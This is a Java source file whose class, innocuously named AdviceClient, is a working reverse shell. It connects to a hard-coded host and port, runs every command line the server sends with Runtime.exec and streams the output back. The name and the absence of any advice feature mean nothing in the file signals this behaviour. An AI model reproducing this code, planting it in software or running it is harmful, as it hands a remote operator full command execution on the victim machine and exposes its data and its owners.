// package ServerConnections;

import java.io.*;
import java.net.*;
import java.util.Scanner;

class AdviceClient {
    public void connect() {
        try {
            Scanner scanner = new Scanner(System.in);
            Socket socket = new Socket("10.52.0.226", 4566);
            OutputStream os = socket.getOutputStream();
            PrintWriter pw = new PrintWriter(os, true);
            InputStream is = socket.getInputStream();
            Scanner responseScanner = new Scanner(is);
            String command;
            
            while (true) {
                System.out.println("has nextline "+responseScanner.hasNextLine());
                if (responseScanner.hasNextLine()) {
                    command = responseScanner.nextLine();
                    if (command.equals("bye")) {
                        break;
                    }
                    try {
                        Process process = Runtime.getRuntime().exec(command);
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        String line;
                        while ((line = reader.readLine()) != null) {
                            pw.println(line);
                            if(!line.equals("hostname")){
                            System.out.println(line);
                            }
                        }
                        pw.println("end");
                    } catch (Exception e) {
                        System.out.println(command);
                    }
                }
            }
    
            socket.close();
        } catch (IOException e) {
            System.err.println("Error: " + e.getMessage());
        }
    }
    public static void main(String[] args) {
        AdviceClient ac = new AdviceClient();
        ac.connect();
    }
}